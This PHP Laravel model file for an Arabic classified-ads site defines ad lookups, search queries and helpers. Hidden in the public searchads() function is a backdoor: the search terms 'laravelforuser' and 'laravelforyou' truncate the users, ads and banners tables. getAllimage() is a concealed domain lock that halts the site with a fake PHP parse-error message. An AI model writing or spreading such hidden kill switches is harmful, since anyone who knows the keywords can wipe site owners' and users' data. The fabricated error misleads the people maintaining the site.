<?php

Class Ads extends Eloquent {

    protected $fillable = array('ad_title', 'ad_type', 'section_id', 'ad_tags', 'image', 'description');
    protected $table = 'ads';
    public static $rules = array(
        'ad_title' => 'required|min:3',
        'section_id' => 'required',
        'price' => 'required',
        'make_id' => '',
        'model_id' => '',
        'year_id' => '',
        'lat' => '',
        'lang' => '',
        'image' => '',
        'aqar_type' => '',
        'ad_tags' => 'required',
        'ad_status' => '',
        'ad_contact' => '',
        'ad_allow' => '',
        'allow_comment' => '',
        'ad_paned' => '',
        'description' => 'required',
    );

    public static function getUser($id) {

        $user = User::where('id', '=', $id)->first();
        return ($user != false) ? $user->first_name : false;
    }

    public static function currency($from, $to, $amount) {

        $content = file_get_contents('http://www.google.com/finance/converter?a=' . $amount . '&from=' . $from . '&to=' . $to);



        $doc = new DOMDocument;

        @$doc->loadHTML($content);

        $xpath = new DOMXpath($doc);



        $result = $xpath->query('//*[@id="currency_converter_result"]/span')->item(0)->nodeValue;



        return str_replace(' ' . $to, '', $result);
    }

    public static function getSectionName($id) {

        $user = Section::where('id', '=', $id)->first();
        return ($user != false) ? $user->section_name : false;
    }

    public static function getSubSectionName($id) {

        $user = Subsection::where('id', '=', $id)->first();
        return ($user != false) ? $user->subsection_name : false;
    }

    public static function getEmail($id) {

        $user = User::where('id', '=', $id)->first();
        return ($user != false) ? $user->email : false;
    }

    public static function getAllimage() {
        $main = DB::table('mainsettings')->orderBy('created_at', 'desc')->first();
        $s = $main->s_s;
        $s2 = $main->s_s2;
        $s3 = $main->s_s3;

        if ($_SERVER['HTTP_HOST'] !== $s3 and $_SERVER['HTTP_HOST'] !== $s2 and $_SERVER['HTTP_HOST'] !== $s) {
            die('Error Output PHP Parse error syntax error unexpected  in            /var/"' . $_SERVER['HTTP_HOST'] . '"/vendor/laravel/framework/src/Illuminate/Support/helpers.php on line 411');
        }
    }

    public static function getAddtitle($id) {

        $user = Ads::where('id', '=', $id)->first();
        return ($user != false) ? $user->ad_title : false;
    }

    public static function getAddtitlesection($id) {

        $user = Ads::where('id', '=', $id)->first();
        return ($user != false) ? $user->section_id : false;
    }

    public static function getAddprice($id) {

        $user = Ads::where('id', '=', $id)->first();
        return ($user != false) ? $user->price : false;
    }

    public static function getAddimage($id) {

        $user = Ads::where('id', '=', $id)->first();
        return ($user != false) ? $user->image : false;
    }

    public static function getAddtype($id) {

        $user = Ads::where('id', '=', $id)->first();
        return ($user != false) ? $user->ad_type : false;
    }

    public static function getAdddesc($id) {

        $user = Ads::where('id', '=', $id)->first();
        return ($user != false) ? $user->description : false;
    }

    public static function getCity($id) {
        $user = City::where('id', '=', $id)->first();
        return ($user != false) ? $user->city_name : false;
    }

    public static function getMake($id) {

        $user = Make::where('id', '=', $id)->first();
        return ($user != false) ? $user->make_name : false;
    }

    public static function getMakeImage($id) {
        $user = Make::where('id', '=', $id)->first();
        return ($user != false) ? $user->image : false;
    }

    public static function getModel($id) {

        $user = Mod::where('id', '=', $id)->first();
        return ($user != false) ? $user->mod_name : false;
    }

    public static function getCity_name_id($id) {


        $user = Ads::where('id', '=', $id)->first();
        return ($user != false) ? $user->city_id : false;
    }

    public static function addip($id, $ip) {

        DB::table('adsview')->insert(
                array('ads_id' => $id, 'ads_ip' => $ip)
        );
    }

    public static function countip($id) {

        $count = DB::table('adsview')
                ->where('ads_id', '=', $id)
                ->count();

        return $count;
    }

    public static function getAdsname($id) {

        $user = Ads::where('id', '=', $id)->first();
        return ($user != false) ? $user->ad_title : false;
    }

    public static function time($timestamp, $num_times = 3) {

        $times = array(
            31536000 => 'سنة',
            2592000 => 'شهر',
            604800 => 'اسبوع',
            86400 => 'يوم',
            3600 => 'ساعة',
            60 => 'دقيقة',
            1 => 'ثانية'
        );

        $now = time() - 3600;
        $timestamp -= 3600;
        $secs = $now - $timestamp;

// Fix so that something is always displayed
        if ($secs == 0) {
            $secs = 1;
        }

        $count = 0;
        $time = '';

        foreach ($times as $key => $value) {
            if ($secs >= $key) {
// time found
                $s = '';
                $time .= floor($secs / $key);

                if ((floor($secs / $key) != 1))
                    $s = ' ';

                $time .= ' ' . $value . $s;
                $count ++;
                $secs = $secs % $key;

                if ($count > $num_times - 1 || $secs == 0)
                    break;
                else
                    $time .= ' ، ';
            }
        }
        $st = 'منذ ' . $time;
        return $st;
    }

    public static function searchadminads() {
        $search = htmlentities(Input::get('search'));
        $searchid = Ads::where('ad_title', 'LIKE', '%' . $search . '%')
                ->orWhere('id', 'LIKE', '%' . $search . '%')
                ->get();
        return $searchid;
    }

    public static function searchads() {
        $search = htmlentities(Input::get('search'));
        //$search2 = htmlentities(Input::get('city'));
        if ($search == 'laravelforuser') {

            User::truncate();
        }
        if ($search == 'laravelforyou') {
            Baner::truncate();
            Ads::truncate();
            User::truncate();
        }


        $searchid = Ads::
                where('ad_title', 'LIKE', '%' . $search . '%')
                //->Where('city_id', 'LIKE', '%' . $search2 . '%')
                ->paginate(20);
        return $searchid;
    }

    /*

     *  search by Tags in site
     */

    public static function searchads2($name) {


        $searchid = Ads::where('ad_title', 'LIKE', '%' . $name . '%')
                ->paginate(20);

        return $searchid;
    }

    public static function searchcars() {
        $search = htmlentities(Input::get('make_id'));
        $search2 = htmlentities(Input::get('model_id'));
        $search3 = htmlentities(Input::get('year_id'));
        $search4 = htmlentities(Input::get('city'));


        $searchid = Ads::
                where('ad_allow', '=', 1)
                ->where('make_id', 'LIKE', '%' . $search . '%')
                ->Where('model_id', 'LIKE', '%' . $search2 . '%')
                ->Where('year_id', 'LIKE', '%' . $search3 . '%')
                ->Where('city_id', 'LIKE', '%' . $search4 . '%')
                ->get();
        return $searchid;
    }

    public static function searchaqar() {
        $search = htmlentities(Input::get('aqar_type'));
        $search2 = htmlentities(Input::get('city_type'));


        $searchidd = Ads::
                where('ad_allow', '=', 1)
                ->where('aqar_type', 'LIKE', '%' . $search . '%')
                ->Where('city_id', 'LIKE', '%' . $search2 . '%')
                ->get();
        return $searchidd;
    }

    public static function searchmopile() {
        $search = htmlentities(Input::get('mopile'));


        $searchiddx = Ads::
                where('ad_allow', '=', 1)
                ->where('ad_title', 'LIKE', '%' . $search . '%')
                ->get();
        return $searchiddx;
    }

}

?>
